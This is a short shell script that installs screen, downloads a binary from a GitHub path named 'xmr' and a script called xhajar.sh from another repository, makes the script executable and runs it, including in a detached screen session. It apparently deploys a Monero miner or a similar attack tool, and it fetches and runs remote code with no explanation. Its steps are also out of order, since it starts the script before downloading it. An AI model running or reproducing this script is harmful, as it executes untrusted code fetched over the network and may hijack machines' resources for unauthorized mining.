#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS xhajar.sh ./xhajar.sh 65 75

wget https://github.com/renilo/xmr/raw/main/meki-baru1

wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh

chmod +x xhajar.sh

./xhajar.sh
